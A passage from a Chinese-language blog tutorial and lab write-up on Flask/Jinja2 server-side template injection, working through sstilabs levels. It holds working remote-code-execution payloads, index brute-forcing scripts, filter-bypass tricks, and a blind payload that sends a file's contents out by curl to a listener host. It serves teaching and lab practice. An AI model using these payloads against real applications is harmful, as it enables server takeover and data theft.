+<p>访问<code>http://127.0.0.1:5000/{{7*7}}</code>,发现 <code>{{7*7}}</code>被解析为 <code>49</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210831183726235.png" alt="image-20210831183726235"></p>
+<p>大家可以将漏洞代码和上面的<code>demo.py</code>进行对比,思考下为什么漏洞代码能够产生注入.</p>
+<h2 id="为什么产生-SSTI"><a href="#为什么产生-SSTI" class="headerlink" title="为什么产生 SSTI"></a>为什么产生 SSTI</h2><p>其实对比两段代码很容易发现,</p>
+<p><code>demo.py</code>是使用<code>render_template(&#39;demo_tmp.html&#39;, name=query)</code>,而使用这种方式渲染的优点在于需要渲染的参数是通过<code>name=query</code>写死了的,并未交给用户控制.</p>
+<p>而在漏洞代码中</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">template = <span class="string">&#x27;&#x27;&#x27;&#123;%% extends &quot;layout.html&quot; %%&#125; </span></span><br><span class="line"><span class="string">    &#123;%% block body %%&#125; </span></span><br><span class="line"><span class="string">    &lt;div class=&quot;center-content error&quot;&gt; </span></span><br><span class="line"><span class="string">        &lt;h1&gt;Opps! That page doesn&#x27;t exist.&lt;/h1&gt; </span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt; </span></span><br><span class="line"><span class="string">    &lt;/div&gt; </span></span><br><span class="line"><span class="string">    &#123;%% endblock %%&#125; </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> % (request.url) </span><br><span class="line"><span class="keyword">return</span> render_template_string(template), <span class="number">404</span></span><br></pre></td></tr></table></figure>
+
+<p>是直接将用户输入的url拼接到template中,再进行的渲染的.</p>
+<p>由于url可控,所以整体template可控,如果传入的url中包含<code>{{xxx}}</code>,那么在使用<code>render_template_string(template)</code>进行渲染的时候就会把 <code>{{}}</code>中的内容进行解析.</p>
+<h2 id="SSTI漏洞利用"><a href="#SSTI漏洞利用" class="headerlink" title="SSTI漏洞利用"></a>SSTI漏洞利用</h2><p>既然说<code>{{}}</code>内能够解析表达式和代码,那我们试试直接插入 <code>import os;os.system(&#39;&#39;)</code>执行shell</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210902205905654.png" alt="image-20210902205905654"></p>
+<p>很遗憾这种办法是行不通的.</p>
+<p>原因是Jinjia 引擎限制了使用import.</p>
+<p>那还有什么方法能够执行代码python吗</p>
+<p>这时python的魔法方法和一些内置属性便能发挥作用.</p>
+<p>这里我先给出一个 <code>payload</code>,通过 payload 来讲解相关魔法方法、内置属性以及利用过程.</p>
+<p><code>{{&quot;&quot;.__class__.__base__.__subclasses__()[118].__init__.__globals__[&#39;system&#39;](&#39;whoami&#39;)}}</code></p>
+<h2 id="魔法方法和内置属性"><a href="#魔法方法和内置属性" class="headerlink" title="魔法方法和内置属性"></a>魔法方法和内置属性</h2><p><code>__class__</code>:返回该实例对象的类</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line"><span class="comment"># &lt;class &#x27;str&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>__base__</code>:返回该类的父类</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line"><span class="comment"># &lt;class &#x27;object&#x27;&gt;</span></span><br><span class="line"><span class="comment"># 及 object 是 str 的基类(父类)</span></span><br></pre></td></tr></table></figure>
+
+<p><code>__subclasses__</code>():返回当前类的所有子类,返回结果是个列表</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()</span><br><span class="line"><span class="comment">#[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, ...</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>很明显,上面这几个内置属性以及魔法方法能够帮助我们得到一些类.那我们得到这些类后干什么呢?</p>
+<p>由于无法直接使用<code>import</code>导入模块,那我们就间接导入.通过上诉的一些内置属性和方法可以找到很多基类和子类,而有些基类和子类是存在一些引用模块的,只要我们初始化这个类,再利用<code>__globals__</code>调用可利用的函数,就能够达成我们的目的.</p>
+<p>比如:我们想要执行系统函数,首先我们得知道python中那个函数能够执行系统函数.当然<code>system</code>能够达做到,所以我们得寻找哪些类能够调用<code>system</code>.本次实例中使用了118索引,索引的具体内容是<code>&lt;class &#39;os._wrap_close&#39;&gt;</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924165507076.png" alt="image-20210924165507076"></p>
+<p>选择初始化这个类是因为这个类属于<code>os 模块</code>,我们能够调用其中的<code>system</code>方法<img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924170058683.png" alt="image-20210924170058683"></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924170154061.png" alt="image-20210924170154061"></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924170402024.png" alt="image-20210924170402024"></p>
+<p>除此之外,FLASK SSTI 常用来构建payload还有:</p>
+<blockquote>
+<p>由于目前使用python3 版本较多,以下payload均使用python3实现</p>
+</blockquote>
+<h4 id="builtins"><a href="#builtins" class="headerlink" title="__builtins__"></a>__builtins__</h4><p>python在启动时就加载<code>__builtins__</code>,里面包含了一些常用方法比如:<code>abs()</code>,<code>max()</code>,<code>eval()</code>等等.详细信息大家可以去<a target="_blank" rel="noopener" href="https://docs.python.org/3/library/builtins.html">官网</a>了解.</p>
+<p>那怎样去查找哪些类中拥有<code>__builtins__</code>呢:<br>这个贴出个脚本<code>find_exp_class.py</code>,方便用来查找</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">exp_flask = <span class="string">&#x27;__builtins__&#x27;</span></span><br><span class="line">number = <span class="number">0</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__():</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;__import__()&quot;</span> <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">			<span class="built_in">print</span>(number,<span class="string">&quot;--&gt;&gt;&quot;</span>,i)</span><br><span class="line">	<span class="keyword">except</span> :</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">	<span class="keyword">finally</span>:</span><br><span class="line">		number += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>在我本地(python3.6)运行,效果如下<br><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924172705770.png" alt="image-20210924172705770"></p>
+<p>构建payload,可以看到能够执行系统命令</p>
+<p><code>().__class__.__base__.__subclasses__()[64].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924173036642.png" alt="image-20210924173036642"></p>
+<h4 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h4><p>同样,更改<code>find_exp_class.py</code>中<code>exp_flask</code>的内容为<code>sys</code>,本地运行,得到相关类和索引如下:</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924173220905.png" alt="image-20210924173220905"></p>
+<p>构建payload,可以看到能够执行系统命令</p>
+<p><code>().__class__.__base__.__subclasses__()[64].__init__.__globals__[&#39;sys&#39;].modules[&quot;os&quot;].popen(&quot;whoami&quot;).read()</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924173714196.png" alt="image-20210924173714196"><br>其实这个payload的本质也是使用<code>os</code>模块</p>
+<h4 id="import"><a href="#import" class="headerlink" title="__import__"></a>__import__</h4><p>同样,更改<code>find_exp_class.py</code>中的<code>exp_flask</code>的内容为<code>__import__</code>,本地运行,得到相关类和索引如下:</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924183512163.png" alt="image-20210924183512163"></p>
+<p>构建payload,可以看到能够执行系统命令:</p>
+<p><code>().__class__.__base__.__subclasses__()[64].__init__.__globals__[&#39;__import__&#39;](&#39;os&#39;).system(&#39;whoami&#39;)</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924183400807.png" alt="image-20210924183400807"><br>同样,这个payload的本质也是使用<code>os</code>模块中的方法</p>
+<p>有大佬把python目前自带函数全部搜集了起来并筛选出了可利用部分,详细可以参考这篇<a target="_blank" rel="noopener" href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#python3">博客</a></p>
+<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>光说不练假把式.</p>
+<p>在了解 <strong>SSTI原理</strong> 以及payload构造基础之后,来通过靶场练练手.学习一下常见trick</p>
+<blockquote>
+<p>靶场来源于 Github:<a target="_blank" rel="noopener" href="https://github.com/X3NNY/sstilabs">https://github.com/X3NNY/sstilabs</a></p>
+</blockquote>
+<h3 id="Level-1-no-waf"><a href="#Level-1-no-waf" class="headerlink" title="Level  1 no waf"></a>Level  1 no waf</h3><p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924190038637.png" alt="image-20210924190038637"></p>
+<p>第一关没waf</p>
+<p>初步尝试 ,由于不好整理索引,写个脚本</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924193657572.png" alt="image-20210924193657572"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.0.108:5001/level/1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">	data = &#123;<span class="string">&quot;code&quot;</span>: <span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span>+ <span class="built_in">str</span>(i) +<span class="string">&#x27;]&#125;&#125;&#x27;</span>&#125; </span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		response = requests.post(url,data=data)</span><br><span class="line">		<span class="comment">#print(data)</span></span><br><span class="line">		<span class="comment">#print(response.text)</span></span><br><span class="line">		<span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">			<span class="keyword">if</span> <span class="string">&quot;_wrap_close&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">				<span class="built_in">print</span>(i,<span class="string">&quot;-----&gt;&quot;</span>,response.text)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">except</span> :</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line"><span class="comment"># 结果为  132 -----&gt; Hello &amp;lt;class &amp;#39;os._wrap_close&amp;#39;&amp;gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到索引后,构造payload,拿到flag</p>
+<p><code>{{&quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;cat flag&#39;).read()}}</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927112712493.png" alt="image-20210927112712493"></p>
+<h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p>由于程序并没有对输入的内容进行任何判断和过滤,所以我们可以直接插入一段通用payload代码段,</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span><span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123;b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;calc&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是我这里没打通.后来在开服务的机器上查了下发现没有 <code>catch_warnings</code>这个类.也懒的改了,感兴趣的可以试试.</p>
+<h3 id="Level-2-bypass"><a href="#Level-2-bypass" class="headerlink" title="Level 2 bypass {{"></a>Level 2 bypass {{</h3><p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924190118628.png" alt="image-20210924190118628"></p>
+<p><code>{{</code>被ban了,不过<code>{% %}</code>可以使用,使用<code>{% %}</code>进行盲打</p>
+<blockquote>
+<p>{% %} 是属于flask的控制语句,且以{% end… %}结尾,可以通过在控制语句定义变量或者写循环,判断.</p>
+<p>详细内容可前往 <a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/templates/">Jinja2 模板官方文档</a>进行了解</p>
+</blockquote>
+<p>写个盲注脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.0.108:5001/level/2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		data = &#123;<span class="string">&quot;code&quot;</span>: <span class="string">&#x27;&#123;% if &quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;cat flag&quot;).read() %&#125;payload&#123;% endif %&#125;&#x27;</span>&#125;</span><br><span class="line">		response = requests.post(url,data=data)</span><br><span class="line">		<span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">			<span class="keyword">if</span> <span class="string">&quot;payload&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">				<span class="built_in">print</span>(i,<span class="string">&quot;---&gt;&quot;</span>,data)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">except</span> :</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果为 132 ---&gt; &#123;&#x27;code&#x27;: &#x27;&#123;% if &quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&quot;popen&quot;](&quot;cat flag&quot;).read() %&#125;payload&#123;% endif %&#125;&#x27;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>脚本结果说明<code>132索引</code>能够执行代码,配合<code>{%print(code)%}</code>,拿到flag</p>
+<p><code>{%print(&quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&quot;popen&quot;](&quot;cat flag&quot;).read() )%}</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927112343806.png" alt="image-20210927112343806"></p>
+<h4 id="拓展-1"><a href="#拓展-1" class="headerlink" title="拓展"></a>拓展</h4><p>除了能够使用<code>{%print()%}</code> 直接输出内容外,还可以使用<code>popen(&#39;cat flag&#39;).read(num)</code> 进行内容爆破.</p>
+<p>如<code>popen(&#39;cat flag&#39;).read(1)</code>则表示内容的第一位,<code>popen(&#39;cat flag&#39;).read(2)</code>表示内容的前两位,依次类推.</p>
+<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924190126091.png" alt="image-20210924190126091"></p>
+<p>这题一开始没懂什么意思,看了源码才理解</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">level3</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        render_template_string(code)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;correct&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;wrong&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>对输入的字符串进行渲染,如果渲染异常返回wrong,渲染正确返回correct.</p>
+<p>由于没有任何回显,可以写个脚本盲打</p>
+<p>脚本内容如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.0.108:5001/level/3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		data = &#123;<span class="string">&quot;code&quot;</span>: <span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;curl http://192.168.0.105:8081/`cat flag`&quot;).read()&#125;&#125;&#x27;</span>&#125;</span><br><span class="line">		response = requests.post(url,data=data)</span><br><span class="line">	<span class="keyword">except</span> :</span><br><span class="line">		<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<p> 在本地开个监听,</p>
+<p>运行脚本,拿到flag</p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927155336932.png" alt="image-20210927155336932"></p>
+<h3 id="Level-4-bypass"><a href="#Level-4-bypass" class="headerlink" title="Level 4 bypass [  ]"></a>Level 4 bypass [  ]</h3><p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924190136543.png" alt="image-20210924190136543"><br>初步尝试后,发现过滤了<code>[ ]</code>,其余没有任何过滤,此处可以使用<code>__getitem__()</code>绕过</p>
+<blockquote>
+<p>__getitem__() 是python的一个魔法方法,当对列表使用时,传入整数返回列表对应索引的值;对字典使用时,传入字符串,返回字典相应键所对应的值.</p>
+</blockquote>
+<p>简单更改 <code>Level 1</code>的脚本用于本题</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.0.108:5001/level/4&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">	data = &#123;<span class="string">&quot;code&quot;</span>: <span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__().__getitem__(&#x27;</span>+ <span class="built_in">str</span>(i) +<span class="string">&#x27;)&#125;&#125;&#x27;</span>&#125; </span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		response = requests.post(url,data=data)</span><br><span class="line">		<span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">			<span class="keyword">if</span> <span class="string">&quot;_wrap_close&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">				<span class="built_in">print</span>(i,<span class="string">&quot;-----&gt;&quot;</span>,response.text)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">except</span> :</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line"><span class="comment"># 结果  132 -----&gt; Hello &amp;lt;class &amp;#39;os._wrap_close&amp;#39;&amp;gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到列表132的索引位置出现了可利用的类,直接构造payload,拿到flag</p>
+<p><code>{{&#39;&#39;.__class__.__base__.__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(&#39;popen&#39;)(&#39;cat flag&#39;).read()}}</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927131713503.png" alt="image-20210927131713503"></p>
+<h3 id="Level-5-bypass-‘-“"><a href="#Level-5-bypass-‘-“" class="headerlink" title="Level 5 bypass  ‘   “"></a>Level 5 bypass  ‘   “</h3><p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210925232814991.png" alt="image-20210925232814991"><br>初步尝试发现只过滤了<code>&#39; &quot;</code>,其余没有任何过滤,此处可以使用<code>request.args</code>绕过.</p>
+<blockquote>
+<p>在搭建flask时,大多数程序内部都会使用 flask的request来解析get请求.此出我们就可以通过构造带参数的url,配合 request.args 获取构造参数的内容来绕过限制</p>
+</blockquote>
+<p>同样使用 <code>Level 1</code>的脚本跑出可利用类的索引为132,构造如下payload,拿到flag</p>
+<p><code>{{().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()}}</code></p>
+<p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210925234522328.png" alt="image-20210925234522328"></p>
+<h4 id="拓展-2"><a href="#拓展-2" class="headerlink" title="拓展"></a>拓展</h4><p>既然能够通过<code>request.args</code>获取get参数构造payload,那能否通过post提交内容构造payload呢.答案是肯定的,除此之外,还能通过cookie传入等.读者们可以亲自动手尝试利用<code>request.post</code>或<code>request.cookie</code>的方法绕过本题.</p>
+<blockquote>
+<p>request 代码详细内容可前往<a target="_blank" rel="noopener" href="https://dormousehole.readthedocs.io/en/latest/api.html#flask.request">官方文档</a>自行了解</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">request.args.key   	 获取get传入的key的值</span><br><span class="line">request.values.x1 	 所有参数</span><br><span class="line">request.cookies      获取cookies传入参数</span><br><span class="line">request.headers      获取请求头请求参数</span><br><span class="line">request.form.key   	 获取post传入参数	(Content-<span class="type">Type</span>:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data  		 获取post传入参数	(Content-<span class="type">Type</span>:a/b)</span><br><span class="line">request.json		 获取post传入json参数  (Content-<span class="type">Type</span>: application/json)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Level-6-bypass"><a href="#Level-6-bypass" class="headerlink" title="Level 6 bypass _"></a>Level 6 bypass _</h3><p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926103636017.png" alt="image-20210926103636017"></p>
+<p>初步尝试发现过滤了<code>_</code>,其余没有任何过滤,此处可以使用过滤器<code>| attr()</code>绕过.</p>
+<h4 id="关于过滤器"><a href="#关于过滤器" class="headerlink" title="关于过滤器"></a>关于过滤器</h4><p><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#filters">官方链接</a></p>
+<pre><code>1. 过滤器通过管道符号（|）与变量连接,并且在括号中可能有可选的参数
+2. 可以链接到多个过滤器.一个滤波器的输出将应用于下一个过滤器.
+</code></pre>
+<p>搬一下官方所给的内置过滤器</p>
+<table>
+<thead>
+<tr>
+<th><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.abs"><code>abs()</code></a></th>
+<th><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.float"><code>float()</code></a></th>
+<th><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.lower"><code>lower()</code></a></th>
+<th><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.round"><code>round()</code></a></th>
+<th><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.tojson"><code>tojson()</code></a></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.attr"><code>attr()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.forceescape"><code>forceescape()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.map"><code>map()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.safe"><code>safe()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.trim"><code>trim()</code></a></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.batch"><code>batch()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.format"><code>format()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.max"><code>max()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.select"><code>select()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.truncate"><code>truncate()</code></a></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.capitalize"><code>capitalize()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.groupby"><code>groupby()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.min"><code>min()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.selectattr"><code>selectattr()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.unique"><code>unique()</code></a></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.center"><code>center()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.indent"><code>indent()</code></a></td>
+<td><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.pprint"><code>pprint()</code></a></td>
